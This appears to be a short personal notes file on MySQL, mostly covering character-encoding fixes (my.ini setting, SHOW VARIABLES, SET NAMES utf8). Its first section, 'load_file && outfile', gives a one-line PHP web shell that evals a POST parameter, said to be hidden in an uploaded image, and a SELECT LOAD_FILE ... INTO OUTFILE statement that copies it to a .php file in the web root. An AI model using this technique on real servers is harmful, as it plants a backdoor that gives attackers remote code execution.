# SQL

## load_file && outfile

``` sql
# shell.jpg content is <?php @eval($_POST[value]);?>
select LOAD_FILE("D:\\www\\uploads\\images\\shell.jpg") into OUTFILE "D:\\www\\uploads\\images\\shell.php";
```

#### 乱码
添加character_set_server = utf8至my.ini

#### 查看编码

``` sql
show variables like '%char%';
```

#### 设置编码
``` sql
set character_set_client = 'utf8';
set character_set_connection = 'utf8';
set character_set_database = 'utf8';
set character_set_results = 'utf8';
set character_set_server = 'utf8';
```

#### sql语句设置编码

``` sql
set names utf8;
```
